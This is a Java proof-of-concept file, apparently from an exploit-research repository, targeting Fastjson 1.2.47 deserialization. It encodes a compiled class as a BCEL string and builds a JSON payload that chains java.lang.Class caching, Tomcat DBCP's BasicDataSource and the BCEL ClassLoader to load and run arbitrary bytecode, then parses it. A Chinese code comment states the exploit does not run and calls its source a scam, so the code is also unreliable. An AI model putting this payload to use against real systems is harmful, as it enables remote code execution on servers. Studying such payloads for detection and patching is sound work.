package org.exploit.third.fastjson;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.nio.file.Files;
import java.nio.file.Paths;
//跑不通，网上骗子写的
//another fastjson高版本利用：https://www.freebuf.com/vuls/361576.html
public class BCEL_1_2_47 {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("target/classes/Runtime_static.class"));
        String bcel = "\""+"$$BCEL$$"+ Utility.encode(code,true)+"\"";
        String poc = "{    \"a\": {        \"@type\": \"java.lang.Class\",        \"val\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"    },    \"b\": {        \"@type\": \"java.lang.Class\",        \"val\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"    },    \"c\": {        \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",        \"driverClassLoader\": {            \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"        },        \"driverClassName\":"+bcel+"    }}";
        System.out.println(poc);
        JSON.parse(poc);
    }
}
